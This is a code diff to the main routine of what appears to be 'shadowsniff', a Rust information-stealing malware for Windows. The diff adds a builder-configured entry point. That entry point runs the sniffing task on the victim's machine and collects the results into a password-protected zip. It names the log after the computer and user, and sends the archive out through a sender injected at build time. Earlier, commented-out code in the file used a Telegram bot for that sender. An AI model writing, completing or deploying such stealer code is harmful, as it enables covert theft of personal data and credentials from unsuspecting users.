@@ -45,11 +45,13 @@ use filesystem::{FileSystem, FileSystemExt};
 use ipinfo::{IpInfo, init_ip_info, unwrapped_ip_info};
 use rand_chacha::ChaCha20Rng;
 use rand_core::RngCore;
+use filesystem::virtualfs::VirtualFileSystem;
 use shadowsniff::SniffTask;
 use tasks::Task;
 use utils::log_debug;
 use utils::pc_info::PcInfo;
 use utils::random::ChaCha20RngExt;
+use zip::ZipArchive;
 
 mod allocator;
 mod panic;
@@ -59,6 +61,7 @@ static ALLOC: WinHeapAlloc = WinHeapAlloc;
 
 #[unsafe(no_mangle)]
 #[allow(unused_unsafe)]
+#[cfg(not(feature = "builder_build"))]
 pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
     if !init_ip_info() {
         panic!()
@@ -71,21 +74,36 @@ pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
 
     let collector = AtomicCollector::default();
 
-    unsafe {
-        SniffTask::default().run(out, &fs, &collector);
-    }
+    SniffTask::default().run(out, &fs, &collector);
 
     let displayed_collector = format!("{}", PrimitiveDisplayCollector(&collector));
 
     log_debug!("{displayed_collector}");
 
-    let _password: String = {
-        let charset: Vec<char> = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+    0
+}
+
+#[cfg(feature = "builder_build")]
+pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
+    if !init_ip_info() {
+        panic!()
+    }
+
+    let fs = VirtualFileSystem::default();
+    let out = &Path::new("\\output");
+    let _ = fs.mkdir(out);
+
+    let collector = AtomicCollector::default();
+
+    SniffTask::default().run(out, &fs, &collector);
+
+    let password: String = {
+        let charset: Vec<char> = "shadowsniff0123456789"
             .chars()
             .collect();
         let mut rng = ChaCha20Rng::from_nano_time();
 
-        (0..10)
+        (0..15)
             .map(|_| {
                 let idx = (rng.next_u32() as usize) % charset.len();
                 charset[idx]
@@ -93,25 +111,22 @@ pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
             .collect()
     };
 
-    // let zip = ZipArchive::default()
-    //     .add_folder_content(&fs, out)
-    //     .password(password)
-    //     .comment(displayed_collector);
-    //
-    // let out = Path::new("output.zip");
-    // let _ = StorageFileSystem.write_file(&out, &zip);
+    let displayed_collector = format!("{}", PrimitiveDisplayCollector(&collector));
 
-    // let telegram = TelegramBotSender::new(
-    //     Arc::from(env!("TELEGRAM_CHAT_ID")),
-    //     Arc::from(env!("TELEGRAM_BOT_TOKEN")),
-    // );
-    //
-    // let _ = telegram.send_archive(generate_log_name(), zip, &collector);
+    let zip = ZipArchive::default()
+        .add_folder_content(&fs, out)
+        .password(password)
+        .comment(displayed_collector);
+
+    let sender = include!(env!("BUILDER_SENDER_EXPR"));
+
+    let _ = sender.send_archive(generate_log_name(), zip, &collector);
 
     0
 }
 
-fn _generate_log_name() -> Arc<str> {
+#[cfg(feature = "builder_build")]
+fn generate_log_name() -> Arc<str> {
     let PcInfo {
         computer_name,
         user_name,
